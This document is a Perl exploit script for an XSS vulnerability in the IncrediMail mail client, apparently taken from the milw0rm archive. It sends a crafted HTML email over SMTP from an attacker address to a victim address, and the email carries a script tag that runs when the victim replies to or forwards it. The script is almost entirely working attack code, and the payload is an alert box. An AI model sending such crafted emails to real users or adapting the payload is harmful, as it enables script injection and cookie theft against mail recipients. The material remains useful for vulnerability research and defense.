<html><head><title>IncrediMail 5.86 (XSS) Script Execution Exploit</title></head><pre>#!/usr/bin/perl -w

# IncrediMail Xe (latest version) XSS Vulnerability 
#
# Discovered by :	Bui Quang Minh
#
# Description	:	The most of popular Mail Client now exclude Script Code for mail content. 
#					It aims to avoid the type of XSS exploitation (For e.g: stolen cookie).
#					IncrediMail also remove Script Code when the user read mail. 
#					However, I found the &quot;Reply&quot; and &quot;Forward&quot; function of the mail client 
#					has not handled mail content well resulting in XSS vulnerability.
#
# My Blog	:	http://minhbq.blogspot.com	

use Net::SMTP;

# ARGV Check
if ($#ARGV != 2) 
{
	print &quot;\nUSAGE: IncrediMail.pl &lt;Mail Server&gt; &lt;Attacker Email&gt; &lt;VicTim Email&gt;\n&quot;;
	exit;
}

$host = $ARGV[0];
$attacker = $ARGV[1];
$victim = $ARGV[2];

# Config SMTP
$smtp = Net::SMTP-&gt;new(	Host =&gt; $host,
						Hello =&gt; 'Hello world',
						Timeout =&gt; 30)
or die &quot;Couldn't connect to Mail Server\n&quot;;

# Attacker and Victim email
$smtp-&gt;mail($attacker);
$smtp-&gt;to($victim);

# Send email
$buffer = &quot;From: XSS Vulnerability\n&quot;.
&quot;To: XSS Vulnerability\n&quot;.
&quot;Subject: XSS Vulnerability\n&quot;.
&quot;MIME-Version: 1.0\n&quot;.
&quot;Content-Type: multipart/mixed;\n&quot;.
&quot;    boundary=\&quot;--=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\&quot;\n\n&quot;.
&quot;----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\n&quot;.
&quot;Content-Type: text/html;\n&quot;.
&quot;	charset=\&quot;utf-8\&quot;\n&quot;.
&quot;Content-Transfer-Encoding: quoted-printable\n\n&quot;.
&quot;Reply or Sender for XSS Vulnerability\n&quot;.
&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//W3C//DTD HTML 4.0 Transitional//EN\&quot;&gt;\n&quot;.
&quot;&lt;HTML&gt;&lt;BODY&gt;\n&quot;.
&quot;&lt;script&gt; alert('XSS Vulnerability') &lt;/script&gt;\n&quot;.
&quot;&lt;/BODY&gt;&lt;/HTML&gt;\n\n&quot;.
&quot;----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019--&quot;;

$smtp-&gt;data();
$smtp-&gt;datasend($buffer);
$smtp-&gt;quit();

print &quot;Send Finish.\n&quot;;

# milw0rm.com [2009-03-24]</pre></html>